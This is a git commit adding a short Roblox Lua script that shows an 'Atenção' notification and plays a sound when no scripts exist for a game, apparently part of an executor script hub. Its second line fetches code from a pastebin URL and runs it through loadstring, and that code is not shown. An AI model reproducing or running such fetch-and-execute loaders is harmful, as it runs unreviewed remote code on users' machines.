f60352a195e12680a272b93a36bfa60924feace3
RhyanXG7 <143280548+RhyanXG7@users.noreply.github.com>
2024-09-05 17:56:38 -0300

    Create Noescript.lua

---
+++ Sc/Noescript.lua
@@ -0,0 +1,18 @@
+-- ISSO AVISA WAUNDO NÃO AH FUNÇÕES NAS PÁGINAS. -- RHYAN57.
+loadstring(game:HttpGet("https://pastebin.com/raw/qH9PEhfQ"))()
+
+-- ERROR
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://3458224686"
+sound.Volume = 1
+sound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+sound:Play()
+sound.Ended:Connect(function()
+    sound:Destroy()
+end)
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "⚠️ !ATENÇÃO! ⚠️",
+    Text = "Não a scripts configurados neste local! ",
+    Icon = "rbxassetid://13264701341",
+    Duration = 9
+})
